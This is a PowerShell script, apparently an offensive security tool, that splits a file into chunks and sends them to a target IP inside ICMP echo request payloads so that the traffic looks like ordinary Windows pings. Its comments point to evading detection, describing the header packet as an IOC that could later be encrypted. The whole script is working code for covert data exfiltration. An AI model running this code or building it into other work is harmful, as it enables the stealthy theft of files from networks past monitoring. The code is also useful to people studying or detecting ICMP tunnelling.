# Author: Dahvid Schloss a.k.a APT Big Daddy
# LinkedIn: https://www.linkedin.com/in/dahvidschloss/
# Date: 04-03-2024
# Update: 9-24-2026
# Patch Notes: 
# - Updated Parms to have a -Risky flag that will allow someone to break over the normal byte size for what a network MTU may support
# - Updated Params in Read-FileInChunks and Run-Pilot to validate to a range that can't exceed 65500
# - Updated Run-Pilot to include a check for the risky flag that limits chunks to a conservative MTU size of 1200. May still fail at scale
# - Updated Read-FileInChunks to just be more efficient. I never went above the 32byte build hearing others wanted to so I'm fixing that here
# Description: Designed for transmitting files over ICMP by breaking them into manageable chunks to emulate a windows default ping

Add-Type -AssemblyName System.Net
Add-Type -AssemblyName System.Net.NetworkInformation

function Read-FileInChunks {
    param(
        [string]$FilePath,
        [ValidateRange(1, 65500)]
        [int]$ChunkSize
    )

    $FileStream = $null

    try {
        $Chunks = [System.Collections.Generic.List[byte[]]]::new()
        $CWDfilePath = Join-Path -Path $PSScriptRoot -ChildPath $FilePath
        $FileStream = [System.IO.File]::OpenRead($CWDfilePath)
        $Buffer = [byte[]]::new($ChunkSize)

        while (($bytesRead = $FileStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
            $Chunk = [byte[]]::new($bytesRead)
            [Array]::Copy($Buffer, $Chunk, $bytesRead)
            $Chunks.Add($Chunk)
        }

        return ,($Chunks.ToArray())
    }
    catch [System.IO.FileNotFoundException] {
        Write-Host "Error: File '$FilePath' not found."
        throw
    }
    catch {
        Write-Host "Error reading file: $_"
        throw
    }
    finally {
        if ($null -ne $FileStream) {
            $FileStream.Dispose()
        }
    }
}


#dat good good
Function Run-Pilot{
    param(
        [string]$targetIP = "127.0.0.1",
        [string]$filePath,
        [ValidateRange(1, 65500)]
        [int]$chunksize = 32,
        [int]$delay = 0,
        [switch]$Risky
    )


    if ($chunksize -gt 1200 -and -not $Risky) { 
        throw "Chunk sizes above 1200 require -Risky."
    }

    # Read file in chunks
    try{$chunks = Read-FileInChunks -FilePath $filePath -ChunkSize $chunksize}
    Catch{return}

    #count the CHUNKS
    $totalChunks = $chunks.Count

    # Create ICMP echo request packet
    $icmpPacket = New-Object System.Net.NetworkInformation.Ping

    # Prepare the first packet with file information to transfer. This is an IOC could probably encrypt it but that comes later when the real crime stuff happens (J/K Special Agent Mendez I gave up that life)
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileType = [System.IO.Path]::GetExtension($filePath)
    $fileInfo = "FileName: $fileName`nFileType: $fileType`nTotalChunks: $totalChunks"
    $firstPacket = [System.Text.Encoding]::ASCII.GetBytes($fileInfo)

    # Send the first packet
    Write-Host -NoNewline "Sending file information... "
    $response = $icmpPacket.Send($targetIP, 1000, $firstPacket)
    if ($response.Status -eq "Success") {
        Write-Host "Success"
    } else {
        Write-Host "[!]Failed - Aborting Transfer"
        return
    }

    # Send each chunk in an ICMP packet and wait for response
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkNumber = $i + 1
        Write-Host -NoNewline "Sending chunk $chunkNumber of $totalChunks... "

        $response = $icmpPacket.Send($targetIP, 1000, $chunks[$i])
        if ($response.Status -eq "Success") {
            Write-Host "Success"
        } else {
            Write-Host "[!]Failed - Aborting Transfer"
            return
            
        }

        # Here is my shit delay funciton which i find hilarious 
        Start-Sleep -Milliseconds $delay
    }
}
